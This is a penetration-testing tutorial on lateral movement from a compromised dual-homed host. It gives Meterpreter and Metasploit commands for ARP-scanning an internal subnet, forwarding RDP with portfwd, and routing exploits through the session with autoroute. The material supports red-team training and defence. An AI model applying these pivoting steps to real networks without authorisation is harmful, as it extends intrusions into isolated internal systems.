---
title: "Network Pivoting and Port Forwarding with Metasploit and Meterpreter"
date: 2015-01-08T22:55:55+00:00
url: "/port-forward-pivoting-meterpreter/"
draft: false
description: "How to pivot through compromised multi-homed hosts into isolated internal networks using Meterpreter's portfwd and Metasploit autoroute."
categories: ["Security", "exploit-dev"]
tags: ["metasploit", "meterpreter", "pivoting", "port-forwarding", "lateral-movement", "red-team"]
---

During penetration tests and red team operations, an initial compromised foothold often resides in a perimeter network (DMZ) or employee subnet. These dual-homed hosts can act as springboards (**pivots**) to reach isolated internal segments unreachable from your attack workstation.

---

### The Network Scenario

- **Attacker Workstation:** `10.0.0.5`
- **Compromised Host (Dual-Homed Foothold):**
  - External NIC: `10.0.0.10`
  - Internal Private Subnet NIC: `10.0.2.15`
- **Internal Target Host (Isolated):** `10.0.2.30`

---

### Step 1: Internal Subnet Discovery (`arp_scanner`)

From your active Meterpreter session on the compromised host, discover live hosts on the internal `10.0.2.0/24` subnet using ARP requests:

```text
meterpreter > run post/windows/gather/arp_scanner RHOSTS=10.0.2.0/24
# Discovered live host: 10.0.2.30 (00:0c:29:ab:cd:ef)
```

---

### Method 1: Local Port Forwarding via `portfwd`

If you want to access a specific internal service (e.g., Remote Desktop on `10.0.2.30:3389`) directly from your attack workstation:

```text
meterpreter > portfwd add -l 9389 -p 3389 -r 10.0.2.30
```
- `-l 9389`: Binds local listening port `9389` on your attack workstation.
- `-p 3389`: Target port on the destination server.
- `-r 10.0.2.30`: Target IP inside the private network.

Now, launch your RDP client against `localhost`:

```bash
xfreerdp /v:127.0.0.1:9389 /u:Administrator
```
Meterpreter transparently tunnels the RDP session through the compromised foothold to `10.0.2.30:3389`.

---

### Method 2: Subnet-Wide Routing (`autoroute` / `route add`)

To allow *all* Metasploit auxiliary and exploit modules to route packets seamlessly through the compromised session:

Background the Meterpreter session (assuming it is Session 1) and add a route:

```text
msf6 > route add 10.0.2.0 255.255.255.0 1
[*] Route added to subnet 10.0.2.0/255.255.255.0 through session 1
```

Or use the automated post module:

```text
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > run
```

You can now launch internal exploits and port scans against `10.0.2.30` as if you were plugged directly into the private switch.
